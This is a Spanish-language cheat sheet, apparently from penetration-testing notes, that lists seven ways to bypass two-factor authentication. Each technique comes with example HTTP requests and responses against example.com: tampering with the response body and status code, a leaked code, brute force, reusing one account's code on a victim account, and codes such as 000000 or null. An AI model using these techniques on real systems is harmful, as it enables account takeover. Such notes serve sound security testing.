# Bypass Two-Factor Authentication

1 - Manipulación de respuestas

si la respuesta es:

        HTTP/1.1 404 Not Found
        ...
        {"code": false}

Prueba éste bypass

        HTTP/1.1 404 Not Found
        ...
        {"code": true}
        
2 - Manipulación de código de estado 

si la respuesta es:

        HTTP/1.1 404 Not Found
        ...
        {"code": false}
        
Prueba éste bypass

        HTTP/1.1 200 OK
        ...
        {"code": false}
        
3 - Código 2FA en respuesta

¡Siempre revisa la respuesta!

        POST /2fa/
        Host: example.com
        ...
        email=example@gmail.com
        
La respuesta es:

        HTTP/1.1 200 OK
        ...
        {"email": "example@gmail.com", "code": "101010"}
        
4 - Fuerza bruta al código 2FA

5 - Falta la validación de integridad del código 2FA, se puede usar el código para cualquier cuenta de usuario

        POST /2fa/
        Host: example.com
        ...
        email=attacker@gmail.com&code=382923
 
 Probar el mismo código para la víctima
 
        POST /2fa/
        Host: example.com
        ...
        email=victim@gmail.com&code=382923        
        
6 - Introduce el código 000000

        POST /2fa/
        Host: example.com
        ...
        code=000000
        
7 - Introduzca el código "null"

        POST /2fa/
        Host: example.com
        ...
        code=null
